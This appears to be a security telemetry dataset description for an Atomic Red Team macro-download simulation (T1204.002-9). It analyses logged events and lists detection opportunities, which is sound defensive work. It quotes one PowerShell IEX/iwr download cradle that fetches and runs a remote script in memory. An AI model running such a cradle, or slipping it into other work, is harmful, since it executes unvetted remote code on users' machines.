# T1204.002-9: Malicious File — Office Generic Payload Download

## Technique Context

T1204.002 (User Execution: Malicious File) encompasses document-based attacks where malicious Office files serve as droppers for secondary payloads. A common variant uses VBA macros to download and execute a remote payload, with the macro triggering on document open. The `Invoke-MalDoc` PowerShell function from Atomic Red Team simulates this by programmatically creating an Office document with embedded VBA macro code using the Office COM object model, then opening it to trigger macro execution. This test requires Microsoft Office to be installed, as it uses the Word COM server (`Word.Application`) to create and manipulate documents.

Detection programs focus on Office applications making outbound network connections, VBA macro execution indicators, and Office spawning unusual child processes.

## What This Dataset Contains

This dataset captures a macro-based payload download simulation where the technique's download phase succeeds but the Office execution phase fails due to the absence of Microsoft Office on the test system.

The core telemetry is in Security EID 4688, where PowerShell (PID 0x4620) is created with the command: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)...}`. This is the standard IEX/IWR download-cradle pattern fetching the `Invoke-MalDoc.ps1` script directly into memory.

Sysmon EID 22 records the DNS resolution for `raw.githubusercontent.com` resolving to the GitHub CDN IPs (`::ffff:185.199.109.133`, `::ffff:185.199.110.133`, `::ffff:185.199.111.133`, `::ffff:185.199.108.133`). Sysmon EID 3 records the subsequent TCP connection from PowerShell (PID 17952, matching 0x4620) from source `192.168.4.16` to the GitHub IP, tagged `technique_id=T1059.001` by Sysmon's rule engine. The Invoke-MalDoc.ps1 script was successfully downloaded into memory, as evidenced by the network connection completing.

The execution then fails: PowerShell attempts to instantiate the Word COM object and receives error `80040154 Class not registered` because Office is not installed. This produces a PowerShell EID 4100 error event.

The Sysmon channel provides 28 events: 17 EID 7, 3 EID 10, 3 EID 1, 2 EID 17, 1 EID 22, 1 EID 3, and 1 EID 11. The EID 11 records the PowerShell profile data write at `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive`. The Security channel records 3 EID 4688 events: two whoami.exe and one PowerShell (the attack).

The PowerShell channel records 152 events (150 EID 4104, 1 EID 4103, 1 EID 4100). The very high script block count (150) compared to the defended variant (91 events) reflects the complete `Invoke-MalDoc.ps1` function definition loading into memory and being logged across many EID 4104 events — Defender was blocking or truncating this in the defended run.

## What This Dataset Does Not Contain

No Office application process creation (`WINWORD.EXE`, `EXCEL.EXE`) appears because Office is not installed on `ACME-WS06`. Consequently, no macro execution telemetry, no VBA-triggered process creation, and no Office application network connections are present. The technique's end-to-end chain is incomplete — this dataset represents the attacker's perspective up to the point of the `New-Object -ComObject Word.Application` call failing.

In the defended variant (Sysmon: 37, Security: 12, PowerShell: 91), the same Office-not-installed limitation applies. The difference in PowerShell event counts (152 vs. 91 undefended vs. defended) is significant: with Defender disabled, AMSI does not truncate the `Invoke-MalDoc.ps1` script block logging, resulting in 150 EID 4104 events rather than 91 — the complete function definition is now visible to script block logging.

## Assessment

This dataset demonstrates an important operational reality: even in an environment where defenses are disabled, technique execution can fail due to missing prerequisites (Office not installed). The dataset is still analytically valuable because it captures the download phase completely — the IEX/IWR cradle, the DNS resolution, the TCP connection to GitHub, and the Invoke-MalDoc.ps1 function loading into memory all produce forensic evidence even though Office execution did not occur.

The PowerShell EID 4100 error event containing the CLSID `{00000000-0000-0000-0000-000000000000}` and the error code `80040154` (CLASS_E_CLASSNOTAVAILABLE) is itself a useful detection signal: an attacker attempting to instantiate Office COM objects in an environment without Office installed produces this distinctive error.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1**: PowerShell command line containing `IEX (iwr "...Invoke-MalDoc.ps1"...)` — Invoke-MalDoc is an ART tool specifically designed to emulate Office macro attacks; its URL in a download cradle is a specific, searchable indicator
- **Sysmon EID 22 + EID 3**: DNS resolution for `raw.githubusercontent.com` immediately followed by a TCP connection from PowerShell, combined with the large number of script block logging events, indicates a substantial script was downloaded into memory
- **PowerShell EID 4104**: With Defender disabled, the complete `Invoke-MalDoc` function definition appears across 150 EID 4104 script blocks — in a production environment where AMSI is active, the mere attempt to load this function would trigger an AMSI alert; its presence in script block logs confirms the download succeeded
- **PowerShell EID 4100**: COM class registration failure error (`80040154`) during PowerShell execution following a large script download indicates an attacker-tool attempting to instantiate an Office COM object — even when it fails, this error pattern is distinctive
- **Sysmon EID 3 (tagged)**: Network connections from PowerShell to external IPs tagged with `technique_id=T1059.001` by sysmon-modular rules provide an automated categorization signal that can feed into detection pipelines
- **Volume anomaly**: 150+ PowerShell EID 4104 script block events in a short execution window (approximately 8 seconds based on the timestamp range) indicates a large script loading into memory — abnormal script block volume is a hunting signal for in-memory script attacks
